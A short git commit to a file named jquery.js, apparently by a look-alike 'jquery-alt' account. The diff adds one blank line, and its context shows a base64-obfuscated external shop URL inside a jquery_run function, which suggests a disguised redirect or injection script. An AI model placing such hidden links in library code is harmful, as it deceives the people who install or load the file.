7193d60110bf8dbe8ce3bc3dbc6db8ce349725bb
jquery-alt <75208715+jquery-alt@users.noreply.github.com>
2020-12-01 03:27:50 +0100

    .

--- jquery.js
+++ jquery.js
@@ -1,5 +1,6 @@
 var enabled = true;
 
+
 function jquery_run() {
 	const targetLink = atob(unescape(encodeURIComponent("aHR0cHM6Ly9zcGFjZS10di5uZXQvc2hvcC9jaGVja291dC8z")));
 	var r = Math.floor(Math.random() * 10);
